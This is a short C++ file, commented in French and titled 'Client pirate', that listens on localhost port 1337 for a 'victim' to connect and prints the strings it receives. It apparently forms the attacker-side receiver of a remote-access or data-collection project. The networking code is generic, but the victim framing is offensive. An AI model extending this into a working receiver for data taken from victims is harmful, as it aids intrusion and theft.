//Client pirate


#include "iostream"
#include "../MyPNet/IncludeMe.h"

int main(){ // Main client -- cible
    if(MyPNet::Network::Initialize()){

        MyPNet::Socket socket;
        if(socket.CreateSocket() == MyPNet::PResult::P_Success){
            std::cout << std::endl<< "Création du socket réussi"<<std::endl;
            if (socket.Listen(MyPNet::IPEndpoint("127.0.0.1",1337))==MyPNet::PResult::P_Success){
                std::cout << "Écoute du Socket complété"<<std::endl;
                //new connection
                MyPNet::Socket connectionACible;
                std::cout<<"Lancement de l'écoute pour la connetion d'une victime" << std::endl;

                if (socket.AcceptConnection(connectionACible) == MyPNet::PResult::P_Success){
                    std::cout<<"Victime connecté" << std::endl;

                    std::string buffer = "";
                    uint32_t  a(3), b(2), c(1);
                    MyPNet::Packet packet;
                    while(true){
                        MyPNet::PResult result = connectionACible.ReceivePaquets(packet);

                        if(result != MyPNet::PResult::P_Success){
                            break;
                        }
                        std::string a;
                        std::string b;
                        packet >> a >> b ;
                        std::cout << a << b;
                    }
                }
            }

            socket.CloseSocket();
        }
    }

    MyPNet::Network::Shutdown(); //ferme l'interface
    return 0;
}